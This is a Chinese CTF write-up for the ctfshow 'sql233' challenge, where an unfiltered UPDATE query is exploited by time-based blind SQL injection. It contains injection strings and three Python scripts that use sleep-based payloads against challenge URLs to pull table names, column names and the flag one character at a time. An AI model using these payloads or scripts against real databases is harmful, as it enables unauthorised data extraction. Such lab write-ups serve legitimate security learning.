# ctfshow-sql233



##### 参考链接

其他大佬链接

feng  https://blog.csdn.net/rfrder/article/details/113759746

Je3    https://blog.csdn.net/jvkyvly/article/details/115458909

Y4	 https://blog.csdn.net/solitudi/article/details/110144623





 查询语句 

```
  //分页查询
  $sql = "update ctfshow_user set pass = '{$password}' where username = '{$username}';";
```



 返回逻辑 

```
  //无过滤
```





```mysql
时间盲注
需要注意的就是sleep那里，是每一列都会sleep一次，所以判断的时间限制要大致算一下
一共有21列


mysql中不支持子查询更新，准确的说是更新的表不能在set和where中用于子查询。那串英文错误提示就是说，不能先select出同一表中的某些值，再update这个表(在同一语句中)。
update 同一个表注入方法
https://www.cnblogs.com/duanxz/p/5099030.html


注入点，在api/index.php，post传参password和username
必须#号闭合 或者  database() where 1=1#
password=0'),username=database()#&username=1
password=0'),username=user()#&username=1



脚本
-------------------
import requests
import time


url="http://47c657b6-8d53-4f47-a86a-b9f79b8cd766.challenge.ctf.show:8080/api/"
flag=''
for i in range(1,100):
    low=32
    high=128
    mid=(low+high)//2
    while low<high:
        payload="'or if(ascii(substr((select group_concat(flagass233) from flag233333),{},1))>{},sleep(0.02),0)#".format(i,mid)
        
        data={
            "username":payload,
            "password":1
        }
        time1=time.time()
        r=requests.post(url,data=data)
        time2=time.time()
        
        print(time2-time1)
        print(low,mid,high)
        time.sleep(0.05)

        if time2-time1>0.4:
            low=mid+1
        else:
            high=mid
        mid=(low+high)//2
    flag+=chr(mid)
    print(flag)
    if mid==32:
        print(flag)  
        break

---------------------


---------------------
"""
Author:feng
"""
import requests
from time import *
def createNum(n):
    num = 'true'
    if n == 1:
        return 'true'
    else:
        for i in range(n - 1):
            num += "+true"
        return num

url='http://e3a564a9-8fda-4003-895a-404b571895a4.chall.ctf.show:8080/api/'

flag=''
for i in range(1,100):
    min=32
    max=128
    while 1:
        j=min+(max-min)//2
        if min==j:
            flag+=chr(j)
            print(flag)
            if chr(j)=='}':
                exit()
            break

        #payload="' or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))<{},sleep(0.02),1)#".format(i,j)
        #payload="' or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flag233333'),{},1))<{},sleep(0.02),1)#".format(i,j)
        payload="' or if(ascii(substr((select group_concat(flagass233) from flag233333),{},1))<{},sleep(0.02),1)#".format(i,j)

        data={
            'password':'1',
            'username':payload
        }
        try:
            r=requests.post(url=url,data=data,timeout=0.35)
            min=j
        except:
            max=j

        sleep(0.2)
    sleep(1)




---------------------



---------------------
"""
Author:Y4tacker
"""
import requests

url = "http://4f5b7639-6d01-45c4-9610-e11239ba8c90.chall.ctf.show/api/?page=1&limit=10"

result = ""
i = 0

while 1:
    i = i + 1
    head = 32
    tail = 127

    while head < tail:
        mid = (head + tail) >> 1
        # 查数据库
        # payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
        # 查表名
        # payload = "select column_name from information_schema.columns where table_name='flag233333' limit 1,1"
        # 查数据
        payload = "select flagass233 from flag233333"
        data = {
            'username': f"1' or if(ascii(substr(({payload}),{i},1))>{mid},sleep(0.05),1)#",
            'password': '4'
        }
        try:
            r = requests.post(url, data=data, timeout=0.9)
            tail = mid
        except Exception as e:
            head = mid + 1
    if head != 32:
        result += chr(head)
    else:
        break
    print(result)













---------------------
```























